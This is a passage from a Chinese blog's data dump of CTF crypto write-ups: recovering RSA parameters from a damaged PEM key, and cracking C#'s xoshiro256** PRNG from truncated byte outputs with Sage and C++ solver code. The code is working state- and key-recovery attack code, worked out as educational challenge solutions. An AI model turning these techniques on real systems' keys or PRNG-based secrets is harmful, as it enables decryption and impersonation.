OtherPrimeInfos OPTIONAL</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}\\mod p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：<br>$$<br>    t = q^{-1} \\pmod p \\\\<br>    tq-1 = 0 \\pmod p \\\\<br>    tq^2 - q = 0 \\pmod n<br>$$<br>然后<br>$$<br>    ed_q = 1 \\pmod{q-1} \\\\<br>    ed_q - 1 = k(q - 1) \\\\<br>    f = (dq_h + dq_l)e - 1 + k = kq<br>$$<br>代入得<br>$$<br>    tf^2 - kf = 0 \\pmod n<br>$$<br>显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。</p>\n<h3 id=\"参数提取\"><a href=\"#参数提取\" class=\"headerlink\" title=\"参数提取\"></a>参数提取</h3><p>然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？<br>对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 <code>long_to_bytes</code> 转换成 bytes ，最后拼接起来。<br>我的提取脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> binascii <span class=\"keyword\">import</span> a2b_base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.asn1 <span class=\"keyword\">import</span> DerInteger</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">pem = <span class=\"string\">&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class=\"line\"><span class=\"string\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span></span><br><span class=\"line\"><span class=\"string\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span></span><br><span class=\"line\"><span class=\"string\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span></span><br><span class=\"line\"><span class=\"string\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span></span><br><span class=\"line\"><span class=\"string\">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pemlist = pem.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">decode_b64 = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> pemlist[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]:</span><br><span class=\"line\">    decode_b64+=a2b_base64(i)</span><br><span class=\"line\">decode_b64 = decode_b64[<span class=\"number\">4</span>:] <span class=\"comment\"># 丢弃前4个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">der_int = DerInteger()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取n</span></span><br><span class=\"line\">n = decode_b64[<span class=\"number\">3</span>:<span class=\"number\">135</span>]</span><br><span class=\"line\">der_int.decode(n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] n =&#x27;</span>,n:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取e</span></span><br><span class=\"line\">e = decode_b64[<span class=\"number\">135</span>:<span class=\"number\">140</span>]</span><br><span class=\"line\">der_int.decode(e)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] e =&#x27;</span>,e:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取CRT系数</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"built_in\">len</span> <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        q_inv_p = decode_b64[-<span class=\"built_in\">len</span>:]</span><br><span class=\"line\">        der_int.decode(q_inv_p)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q_inv_p =&#x27;</span>,q_inv_p:=der_int.value)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">len</span>+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(len)    # 67</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"comment\"># print(q_inv_p.bit_length())   # 512</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取dp低位</span></span><br><span class=\"line\">dp_l = decode_b64[-<span class=\"number\">82</span>:-<span class=\"number\">67</span>]</span><br><span class=\"line\"><span class=\"comment\"># print(dp_l)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] dp_l =&#x27;</span>,bytes_to_long(dp_l))</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 <code>bytes_to_long</code> 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？</p>\n<p>以下是新List：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...</span><br></pre></td></tr></table></figure>\n\n<p>这里涉及一个<strong>ASN.1</strong>（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：<strong>标志域、长度域、值域</strong><br>标志域中，约定 02 表示整数<br>长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况<br>定长时，若值域长度不超过 127 ，则用<strong>短格式</strong>表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用<strong>长格式</strong>表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。<br>现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。<br>再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 <code>bytes_to_long</code> 解析出来的数据，也是 $n$<br>那么现在你应该也可以尝试写出 $e$ 的编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x03\\x01\\x00\\x01</span><br></pre></td></tr></table></figure>\n\n<p>细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？<br>答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0\\x82\\x02^</span><br></pre></td></tr></table></figure>\n\n<p>后两个字节 <code>bytes_to_long</code> 解码后是 606 ，恰为后面跟的完整数据的长度</p>\n<blockquote>\n<p>后来偶然间发现竟然有类似的题目（）<br><a href=\"https://ctftime.org/task/2127\">0CTF 2016 Quals equation</a></p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ\">https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ</a><br><a href=\"https://www.likecs.com/show-40060.html\">https://www.likecs.com/show-40060.html</a></p>"},{"title":"2023 BricsCTF - random","date":"2023-09-30T12:58:00.000Z","_content":"\n持续复健中。。。\n<!--more-->\n********************************\n\n## 题目\n\n密码太狠了，这题也是 0 解。\n给了一个 `Program.cs` 如下：\n\n```csharp\nvar rng = new Random();\nbyte[] Encrypt(byte[] x) => x.Select(a=>(byte)(a^rng.Next(256))).ToArray();\nConsole.WriteLine(Convert.ToHexString(Encrypt(File.ReadAllBytes(\"flag.txt\"))));\nConsole.WriteLine(Convert.ToHexString(Encrypt(new byte[2000])));\n```\n\n题文如下:\n\n```plain\nThis is xoshiro256** 1.0, one of our all-purpose, rock-solid generators. It has excellent (sub-ns) speed, a state (256 bits) that is large enough for any parallel application, and it passes all tests we are aware of.\n```\n\n## 分析\n\n在 GitHub 找到了 `xoshiro256** 1.0` 的源码，状态更新函数如下：\n\n```csharp\nulong t = _s1 << 17;\n_s2 ^= _s0;\n_s3 ^= _s1;\n_s1 ^= _s2;\n_s0 ^= _s3;\n_s2 ^= t;\n_s3 = BitOperations.RotateLeft(_s3, 45);\n```\n\n提出 result 的函数如下：\n\n```csharp\nresult = BitOperations.RotateLeft(_s1 * 5, 7) * 9\n```\n\n看起来也是线性的，一开始想尝试像 MT19937 一样造个状态转移矩阵出来，但是理论上状态转移矩阵是 256 维的，而他给出了 8*2000=16000 个 bit，多太多了，结果也失败了。\n\n## 题解\n\n用 Copilot 翻译一下官方的 wp 先。\n\n当没有指定 `seed` 时，64 位机器上的最新版本的 C# 使用 xoshiro256** PRNG：\n\n```csharp\ninternal ulong NextUInt64()\n{\n    ulong s0 = _s0, s1 = _s1, s2 = _s2, s3 = _s3;\n\n    ulong result = BitOperations.RotateLeft(s1 * 5, 7) * 9;\n    ulong t = s1 << 17;\n\n    s2 ^= s0;\n    s3 ^= s1;\n    s1 ^= s2;\n    s0 ^= s3;\n\n    s2 ^= t;\n    s3 = BitOperations.RotateLeft(s3, 45);\n\n    _s0 = s0;\n    _s1 = s1;\n    _s2 = s2;\n    _s3 = s3;\n\n    return result;\n}\n```\n\n这个 RNG 的状态转移函数是 GF(2) 下的线性函数，而 `result` 是 `s1` 的非线性函数。如果我们能得到 NextUInt64 的精确返回值，那么就能轻松破解 RNG。我们可以通过乘以乘法逆元来将 `s1` 的每一位表示为初始状态的线性函数，构建一个线性方程组并解出初始状态。但是这道题给出的是 `rng.Next(256)` 的输出，就是只保留 `result` 的高 8 位（草，当时以为是低 8 位）。这样就无法从中获得 `s1` 的任何信息。\n\n我们还可以检查在 `result` 的值确定的情况下，`s1` 的位之间是否存在固定的线性（或仿射）关系：\n\n```python\nfrom sage.all import *\nimport random\ndef f(x):\n    x *= 5\n    x %= 2**64\n    x = (x << 7) | (x >> (64 - 7))\n    x %= 2**64\n    x *= 9\n    x %= 2**64\n    return x >> 56\nvectors = [[] for _ in range(256)]\nfor i in range(100000):\n    a = random.getrandbits(64)\n    v = vector(GF(2), '1' + bin(a)[2:].zfill(64))\n    vectors[f(a)].append(v)\nfor i in range(256):\n    mat = matrix(GF(2), vectors[i])\n    print(mat.rank(), len(vectors[i]))\n```\n\n对于每个 `result` 的值，这个程序生成了一些随机的 `s1` 的可能值，然后计算由这些值的位（和一个 1 来处理异或 1 的子集）生成的矩阵的秩。所有 256 个矩阵的秩都是 65，这意味着向量是独立的，对于任何 `result` 的值都不存在固定的仿射关系，因此无法从中获得任何信息。\n\n> 这里的秩应该是倾向列秩，即他的意思是对于 `s1` 的 bits，不存在哪个 bit 能由其他 bits 线性组合（或者线性组合再取反）后得到。不是很明白检查这个有啥用。\n\n可以获得**概率**线性关系，但是解线性系统就变成了 LPN（Learning Parity with Noise, 带噪声的学习奇偶校验）问题，据我所知，目前还没有足够快的算法。\n\n> LPN 问题具体来说是这样的：给定一个二进制矩阵 $A$ 和一个噪声向量 $e$，求解未知的二进制向量 $s$ 使得 $As + e = b\\pmod2$。其中，$A$ 是一个随机生成的二进制矩阵，$s$ 是一个未知的二进制向量，$e$ 是一个含有少量随机错误的二进制向量，$b$ 是我们观测到的结果向量。噪声向量 $e$ 的存在使得这个问题变得非常困难。\n\n这里可能有多个解；我找到的解是检查**二次关系**：\n\n> 这里不是很懂，为啥没有线性关系就能有二次关系。\n\n- 假设 `result` 的值是固定的，可能存在非平凡的次数 <=2 的布尔函数，当在 `s1` 上取值时总是为真。函数 `f(...) = 1` 符合这个描述，但是不值得考虑，因为它不提供任何信息。\n- 函数可以写成 $$f(x_1, \\dots, x_{64}) = k_0 + \\sum_{i} k_i x_i + \\sum_{i \\le j} k_{ij} x_i x_j,$$ 并且 `s1` 的每一位都可以表示为 $\\sum_i k_i s_i$，其中 s 是初始状态。\n- 我们可以直接将 `s1` 的位的表达式代入 $f$，展开括号并获得对初始状态为真的二次方程。\n\n我们仍然需要找到这些二次布尔函数。这可以通过生成许多随机的 64 位向量来完成，这些向量对应于给定的 `result >> 56` 的值，为它们中的每一个计算所有 $1 + 64 + \\frac{64 \\cdot 63}2 = 2081$ 个单项式，并找到矩阵的核。实现在 `gen_rels.cpp` 中，它平均每个输出字节找到 23 个方程。\n\n这使我们能够在 256 个变量上创建一个超定的二次方程组，它的初始状态是它的（希望是唯一的）解。我用来解决它的算法是线性化：我们可以将每个单项式（如 $x_1x_2$）视为单独的变量。然后我们将有一个线性方程组，其中 $1 + 256 + \\frac{256 \\cdot 255}2 = 32897$ 个变量，可以使用 M4RI 解决。实现在 `hax.cpp` 中，它期望 `gen_rels.cpp` 的输出在文件 `list_rels` 中，`output.txt` 的十六进制解码版本在文件 `out_bin` 中。\n\n> M4RI（Method of Four Russians for Inversion，四俄方法的逆运算方法）是一种针对有限域 GF(2) 上的矩阵运算（特别是矩阵求逆）的高效算法。它的名字来源于一种叫做“四俄罗斯算法”的技术，该技术是为了加速某些基本运算而发明的。\n在 Debian 系中可通过 `sudo apt-get install libm4ri-dev` 安装 M4RI 库。\n\n`gen_rel.cpp` 如下：\n\n```c++\n#include <vector>\n#include <random>\n#include <m4ri/m4ri.h>\n// we need to find degree 2 relations that hold certainly\nuint8_t f(uint64_t x)\n{\n    x *= 5;\n    x = (x << 7) | (x >> (64 - 7));\n    x *= 9;\n    return x >> 56;\n}\nvoid process(uint8_t tgt)\n{\n    std::mt19937_64 mt;\n    size_t n_cols = 1;\n    n_cols += 64;\n    n_cols += 64 * 63 / 2;\n    fprintf(stderr, \"%zu monomials\\n\", n_cols);\n    mzd_t *A = mzd_init(20000, n_cols);\n    for(size_t ri = 0; ri < A->nrows; ri++)\n    {\n        uint64_t x = 0;\n        do\n            x = mt();\n        while(f(x) != tgt);\n        //printf(\"%zu\\n\", x);\n        size_t mi = 0;\n        mzd_write_bit(A, ri, mi++, 1);\n        for(size_t i = 0; i < 64; i++)\n            mzd_write_bit(A, ri, mi++, (x >> i) & 1);\n        for(size_t i = 0; i < 64; i++)\n        for(size_t j = 0; j < i; j++)\n            mzd_write_bit(A, ri, mi++, (x >> i) & (x >> j) & 1);\n        assert(mi == n_cols);\n    }\n    mzd_t* ker = mzd_kernel_left_pluq(A, 0);\n    fprintf(stderr, \"mat dim: %zu rows, %zu cols\\n\", A->nrows, A->ncols);\n    fprintf(stderr, \"ker dim: %zu rows, %zu cols\\n\", ker->nrows, ker->ncols);\n    mzd_t* tker = mzd_transpose(nullptr, ker);\n    fprintf(stderr, \"tker dim: %zu rows, %zu cols\\n\", tker->nrows, tker->ncols);\n    mzd_free(A);\n    mzd_free(ker);\n    /*\n    // check again that the relations are certain (not very fast)\n    for(size_t ri = 0; ri < tker->nrows; ri++)\n    {\n        for(size_t _ = 0; _ < 100000; _++)\n        {\n            uint64_t x = 0;\n            do\n                x = mt();\n            while(f(x) != tgt);\n            //printf(\"%zu\\n\", x);\n            size_t nm = 0;\n            size_t mi = 0;\n            nm ^= mzd_read_bit(tker, ri, mi++);\n            for(size_t i = 0; i < 64; i++)\n                nm ^= mzd_read_bit(tker, ri, mi++) & (x >> i) & 1;\n            for(size_t i = 0; i < 64; i++)\n            for(size_t j = 0; j < i; j++)\n                nm ^= mzd_read_bit(tker, ri, mi++) & (x >> i) & (x >> j) & 1;\n            //assert(mi == n_cols);\n            assert(nm == 0);\n        }\n    }\n    */\n    for(size_t ri = 0; ri < tker->nrows; ri++)\n    {\n        printf(\"%d \", (int)tgt);\n        for(size_t ci = 0; ci < tker->ncols; ci++)\n            printf(\"%d\", (int)mzd_read_bit(tker, ri, ci));\n        printf(\"\\n\");\n    }\n    mzd_free(tker);\n}\nint main()\n{\n    for(size_t i = 0; i < 256; i++)\n        process(i);\n}\n```\n\n`hax.cpp` 如下：\n\n```c++\n#include <array>\n#include <vector>\n#include <random>\n#include <bitset>\n#include <m4ri/m4ri.h>\nuint8_t func(uint64_t x)\n{\n    x *= 5;\n    x = (x << 7) | (x >> (64 - 7));\n    x *= 9;\n    return x >> 56;\n}\nconstexpr size_t N_MONO = 1 + 256 + 256 * 255 / 2;\nusing deg2_rel = std::bitset<1 + 256 + 256 * 255 / 2>;\nusing deg2_rel64 = std::bitset<1 + 64 + 64 * 63 / 2>;\nusing lin_rel = std::bitset<256>;\nstruct sym_u64\n{\n    lin_rel st[64] {};\n    sym_u64& operator^=(const sym_u64& rhs)\n    {\n        for(size_t i = 0; i < 64; i++)\n            st[i] ^= rhs.st[i];\n        return *this;\n    }\n    sym_u64 operator^(const sym_u64& rhs) const\n    {\n        sym_u64 ret = *this;\n        ret ^= rhs;\n        return ret;\n    }\n    sym_u64 operator<<(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64 - by; i++)\n            ret.st[i + by] = st[i];\n        return ret;\n    }\n    sym_u64 operator>>(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64 - by; i++)\n            ret.st[i] = st[i + by];\n        return ret;\n    }\n    sym_u64 rotl(int by) const\n    {\n        sym_u64 ret {};\n        for(size_t i = 0; i < 64; i++)\n            ret.st[(i + by)%64] = st[i];\n        return ret;\n    }\n};\nstruct sym_xs256\n{\n    sym_u64 s0, s1, s2, s3;\n    sym_xs256()\n    {\n        for(size_t i = 0; i < 64; i++)\n        {\n            s0.st[i][i] = true;\n            s1.st[i][i+64] = true;\n            s2.st[i][i+128] = true;\n            s3.st[i][i+192] = true;\n        }\n    }\n    sym_u64 step()\n    {\n        sym_u64 res_s1 = s1;\n        sym_u64 t = s1 << 17;\n        s2 ^= s0;\n        s3 ^= s1;\n        s1 ^= s2;\n        s0 ^= s3;\n        s2 ^= t;\n        s3 = s3.rotl(45);\n        return res_s1;\n    }\n};\nstd::array<std::vector<deg2_rel64>, 256> krels;\ndeg2_rel to_deg2(lin_rel lhs)\n{\n    deg2_rel ret {};\n    for(size_t i = 0; i < 256; i++)\n        ret[i+1] = lhs[i]; // 0 is the constant term\n    return ret;\n}\ndeg2_rel mul(lin_rel lhs, lin_rel rhs)\n{\n    deg2_rel ret {}; // compute the product coefficients directly\n    size_t mi = 1;\n    for(size_t i = 0; i < 256; i++)\n    {\n        ret[mi] = ret[mi] ^ (lhs[i] & rhs[i]);\n        mi++;\n    }\n    for(size_t i = 0; i < 256; i++)\n    for(size_t j = 0; j < i; j++)\n    {\n        ret[mi] = ret[mi] ^ (lhs[i] & rhs[j]);\n        ret[mi] = ret[mi] ^ (lhs[j] & rhs[i]);\n        mi++;\n    }\n    return ret;\n}\nint main()\n{\n    FILE* f = fopen(\"list_rels\", \"r\");\n    while(true)\n    {\n        char buf[4096];\n        int res = 0;\n        int ok = fscanf(f, \"%d%s\", &res, buf);\n        if(ok < 2)\n            break;\n        deg2_rel64 rel {};\n        for(size_t i = 0; i < rel.size(); i++)\n            rel[i] = buf[i] - '0';\n        krels[res].push_back(std::move(rel));\n    }\n    fclose(f);\n    sym_xs256 rng {};\n    // we're targeting the state before the flag is encrypted so skip some bytes now\n    f = fopen(\"out_bin\", \"rb\");\n    constexpr int FLAG_LEN = 41;\n    uint8_t encflag[FLAG_LEN];\n    for(size_t i = 0; i < 41; i++)\n    {\n        encflag[i] = fgetc(f);\n        rng.step();\n    }\n    std::vector<deg2_rel> all_rels;\n    for(size_t i = 0; i < 2000; i++)\n    {\n        fprintf(stderr, \"i=%d\\n\", i);\n        uint8_t outb = fgetc(f);\n        sym_u64 s1 = rng.step();\n        for(const deg2_rel64& big_rel : krels[outb])\n        {\n            deg2_rel res {};\n            size_t mi = 1;\n            if(big_rel[0])\n                res[0] = res[0] ^ 1;\n            for(size_t i = 0; i < 64; i++)\n            {\n                if(big_rel[mi])\n                    res ^= to_deg2(s1.st[i]);\n                mi++;\n            }\n            for(size_t i = 0; i < 64; i++)\n            for(size_t j = 0; j < i; j++)\n            {\n                if(big_rel[mi])\n                    res ^= mul(s1.st[i], s1.st[j]);\n                mi++;\n            }\n            all_rels.push_back(res);\n        }\n    }\n    fclose(f);\n    fprintf(stderr, \"%zu\\n\", all_rels.size());\n    mzd_t *A = mzd_init(all_rels.size(), N_MONO);\n    for(size_t i = 0; i < all_rels.size(); i++)\n    {\n        for(size_t j = 0; j < N_MONO; j++)\n            mzd_write_bit(A, i, j, all_rels[i][j]);\n    }\n    // we solve this system by linearization\n    fprintf(stderr, \"starting solve\\n\");\n    fprintf(stderr, \"mat dim: %zu rows, %zu cols\\n\", A->nrows, A->ncols);\n    mzd_t* ker = mzd_kernel_left_pluq(A, 0);\n    mzd_t* tker = mzd_transpose(nullptr, ker);\n    fprintf(stderr, \"tker dim: %zu rows, %zu cols\\n\", tker->nrows, tker->ncols);\n    mzd_free(A);\n    mzd_free(ker);\n    assert(tker->nrows == 1); // only 1 solution\n    sym_xs256 rng2 {};\n    lin_rel ist; // the initial state. dot product with symbolic output equals concrete output\n    for(size_t j = 0; j < 256; j++)\n        ist[j] = mzd_read_bit(tker, 0, j + 1);\n    for(size_t i = 0; i < FLAG_LEN; i++)\n    {\n        sym_u64 s1 = rng2.step();\n        uint64_t x = 0;\n        for(size_t j = 0; j < 64; j++)\n            x |= uint64_t((s1.st[j] & ist).count() % 2) << j;\n        uint8_t outb = func(x);\n        printf(\"%c\", encflag[i] ^ outb);\n    }\n    printf(\"\\n\");\n}\n```\n\n## 我的想法\n\n首先我感觉这玩意挺抽象的，思路先不谈，光那俩 cpp 除了春哥我不知道还有谁能这么点时间内造出来。\n试着用 sage 写了下 `gen_rels.cpp`，直接慢了几十倍，好吧还是 C++ 厉害。（那之前的 MT19937 的题我是不是可以用 C++ 重写来着，又给自己挖个坑）\n\n先看看 `gen_rels.cpp` 干了些啥：对每一个 0-255 的 target，找到 20000 个能让 `f(x) == target` 的 x，然后把这些 x 的每一位都当作一个变量，构造一个矩阵，然后求这个矩阵的核，这个核就是 `f(x) == target` 的所有关系的矩阵表示。这里的矩阵是 20000*2081 的，然后用 M4RI 求核。\n最终求出的每个向量与其对应 s1 expand 出的二次向量的内积都为 0。\n\n再看 `hax.cpp`，~~疲软了，有空再来补坑。~~\n时隔大半年回来补了（\n\n这里面真是一堆语法可真是把没学过 C++ 的我搞得一头雾水。\n直接用最憨的方法，一个个看。\n\n函数 `func`： 将 `s1` 转成 `result`\n`deg2_rel` 是一个 32897 维的向量，`deg2_rel64` 是 2081 维的向量，`lin_rel` 是 256 维的向量。\nstruct `sym_u64`： 64 维的向量，每一个分量都是一个 `lin_rel`，那么这应该算一个 64*256 的矩阵，并定义其异或、左移、右移、循环左移操作。\nstruct `sym_xs256`： 4 个 `sym_u64` 类型的 `s1 s2 s3 s4`，并定义了 `step` 操作，这里不是很懂，按理说这四个状态向量都是 64 位的。\n定义了一个 `krels`，包含 256 个 `std::vector<deg2_rel64>` 类型的元素。每一个 `std::vector<deg2_rel64>` 可以包含任意数量的 `deg2_rel64` 对象。\n\n现在来看 `main` 函数：\n把 `list_rels` 文件中的内容读入到 `krels` 中。\n创建一个 `sym_xs256` 类的实例 `rng`，然后读进 encflag，每读一个字符更新一次 `rng` 的状态。\n对每一个泄露的字节，找到所有 `krels` 中对应的 `big_rels`，然后对每一个 `big_rels`，新建一个类型为 `deg2_rel` 的 `res`，常数项（0 号位）和 `big_rels` 取等，1-64 号位是 $(b_1, b_2, \\cdots, b_{64})\\cdot(s_1,s_2,\\cdots,s_{64})^T$，左边的 $b$ 即为 `big_rels` 的 1-64 号位，右边是 s1 的 64*256 矩阵。后面没看懂。\n\n最后汇总到的一个 `all_rels`，求核得到的矩阵只有一个 32897 维的向量，剥出 1-256 号位得到 `ist`。\n\n整个看下来就是迷迷糊糊的。\n\n黑化了。\n\nI recently contacted the author of this challenge for assistance and was surprised by his quick response. Despite it being 00:30 when I reached out, he replied by 02:30. Given his username, I assumed he was in Russia, but his response time led me to question whether his work and rest schedule is typical or if he is not currently in Russia.\n\nThe key to understanding the classes `sym_u64` and `sym_xs256` lies in the fact that the four states can be represented as a 256-bit vector. This representation forms a linear system that omits the non-linear scrambler `f(x)`. Thus, the state transition function can be expressed as a matrix, and the `step` function simply performs matrix multiplication. More specifically, the n-th state is obtained by multiplying the transition matrix $T$ by the initial state $n$ times.\n\nThe construction of `res` can be explained as follows:\n\nFirst, it's important to note that `s1` is a 64x256 matrix which, when multiplied by `ist`, yields the current real state of `s1`. Each `s1[i]` is a 256-dimensional vector; its dot product with `ist` determines the i-th bit of the current `s1`.\nFor each `res` in `all_rels`, `res` is computed by multiplying the `big_rel` (a 2081-dimensional vector) by a 2081x256 matrix, which is derived from `s1`.\n\n## 参考\n\n<https://github.com/colgreen/Redzen/blob/main/Redzen/Random/Xoshiro256StarStarRandom.cs>\n<https://github.com/C4T-BuT-S4D/bricsctf-2023-stage1/blob/master/tasks/crp/random/README.md>\n","source":"_posts/2023 BricsCTF - random.md","raw":"---\ntitle: 2023 BricsCTF - random\ndate: 2023-09-30 20:58:00\ntags: [CTF, Crypto]\ncategories: 题解\n---\n\n持续复健中。。。\n<!--more-->\n********************************\n\n## 题目\n\n密码太狠了，这题也是 0 解。\n给了一个 `Program.cs` 如下：\n\n```csharp\nvar rng = new Random();\nbyte[] Encrypt(byte[] x) => x.Select(a=>(byte)(a^rng.Next(256))).ToArray();\nConsole.WriteLine(Convert.ToHexString(Encrypt(File.ReadAllBytes(\"flag.txt\"))));\nConsole.WriteLine(Convert.ToHexString(Encrypt(new byte[2000])));\n```\n\n题文如下:\n\n```plain\nThis is xoshiro256** 1.0, one of our all-purpose, rock-solid generators. It has excellent (sub-ns) speed, a state (256 bits) that is large enough for any parallel application, and it passes all tests we are aware of.\n```\n\n## 分析\n\n在 GitHub 找到了 `xoshiro256** 1.0` 的源码，状态更新函数如下：\n\n```csharp\nulong t = _s1 << 17;\n_s2 ^= _s0;\n_s3 ^= _s1;\n_s1 ^= _s2;\n_s0 ^= _s3;\n_s2 ^= t;\n_s3 = BitOperations.RotateLeft(_s3, 45);\n```\n\n提出 result 的函数如下：\n\n```csharp\nresult = BitOperations.RotateLeft(_s1 * 5, 7) * 9\n```\n\n看起来也是线性的，一开始想尝试像 MT19937 一样造个状态转移矩阵出来，但是理论上状态转移矩阵是 256 维的，而他给出了 8*2000=16000 个 bit，多太多了，结果也失败了。\n\n## 题解\n\n用 Copilot 翻译一下官方的 wp 先。\n\n当没有指定 `seed` 时，64 位机器上的最新版本的 C# 使用 xoshiro256** PRNG：\n\n```csharp\ninternal ulong NextUInt64()\n{\n    ulong s0 = _s0, s1 = _s1, s2 = _s2, s3 = _s3;\n\n    ulong result = BitOperations.RotateLeft(s1 * 5, 7) * 9;\n    ulong t = s1 << 17;\n\n    s2 ^= s0;\n    s3 ^= s1;\n    s1 ^= s2;\n    s0 ^= s3;\n\n    s2 ^= t;\n    s3 = BitOperations.RotateLeft(s3, 45);\n\n    _s0 = s0;\n    _s1 = s1;\n    _s2 = s2;\n    _s3 = s3;\n\n    return result;\n}\n```\n\n这个 RNG 